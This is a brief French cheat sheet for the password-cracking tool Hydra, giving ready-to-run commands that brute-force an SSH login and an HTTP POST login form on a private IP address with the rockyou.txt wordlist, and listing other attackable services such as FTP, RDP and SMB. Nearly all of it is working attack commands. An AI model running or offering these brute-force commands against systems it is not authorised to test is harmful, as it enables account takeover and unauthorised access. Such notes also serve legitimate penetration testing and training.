# Hydra – Bruteforce login

## 🎯 Objectif
Tester des identifiants sur services distants.

## 🔧 SSH
hydra -l user -P rockyou.txt ssh://192.168.1.10

## 🔧 HTTP POST
hydra -l admin -P rockyou.txt 192.168.1.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"

## 📌 Services supportés
SSH, FTP, RDP, HTTP, SMB...